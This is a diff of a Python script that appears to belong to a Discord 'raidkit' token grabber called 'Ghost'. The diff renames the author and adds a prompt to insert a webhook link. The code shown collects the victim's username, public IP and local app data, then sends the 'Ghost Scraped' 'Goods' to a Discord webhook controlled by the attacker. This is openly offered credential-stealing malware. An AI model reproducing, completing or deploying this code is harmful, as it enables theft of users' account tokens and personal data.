@@ -1,4 +1,5 @@
-# By ytsix (https://github.com/ytsix); part of the Discord Raidkit (https://github.com/Catterall/discord-raidkit).
+# By revenge8808 (https://github.com/revenge8808); part of the Discord Raidkit (https://github.com/Catterall/discord-raidkit).
+
 
 import requests, os, re, sys, shutil, string, winreg
 
@@ -37,7 +38,7 @@ def GhostInf():
 
 
 def GhostProc():
-    hook = Webhook("")
+    hook = Webhook("")  # Place your webhook link here!
     user = os.getenv("UserName")
     hostname = requests.get("https://api.ipify.org").text 
     local = os.getenv('LOCALAPPDATA')
@@ -73,7 +74,7 @@ def GhostProc():
         message += '```'
 
 
-        embed = Embed(title=f' [ [#by @ytsix] Ghost Scraped -> | {user} | {hostname} ] ',color=16764108)
+        embed = Embed(title=f' [ [#by @revenge8808] Ghost Scraped -> | {user} | {hostname} ] ',color=16764108)
         embed.add_field("Goods =>",message)
         hook.send(embed=embed)
         
